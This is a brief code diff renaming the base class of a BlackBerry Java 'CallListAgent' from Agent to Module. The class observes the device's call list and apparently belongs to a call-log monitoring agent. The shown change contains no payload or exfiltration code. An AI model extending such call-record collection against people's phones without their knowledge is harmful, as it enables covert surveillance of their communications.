@@ -23,7 +23,7 @@ import blackberry.utils.Utils;
 /**
  * The Class CallListAgent.
  */
-public final class CallListAgent extends Agent implements CallListObserver {
+public final class CallListAgent extends Module implements CallListObserver {
     //#ifdef DEBUG
     private static Debug debug = new Debug("CallListAgent", DebugLevel.VERBOSE);
     //#endif
@@ -35,7 +35,7 @@ public final class CallListAgent extends Agent implements CallListObserver {
      *            the agent status
      */
     public CallListAgent(final boolean agentEnabled) {
-        super(Agent.AGENT_CALLLIST, agentEnabled, Conf.AGENT_CALLIST_ON_SD, "CallListAgent");
+        super(Module.AGENT_CALLLIST, agentEnabled, Conf.AGENT_CALLIST_ON_SD, "CallListAgent");
 
     }
 
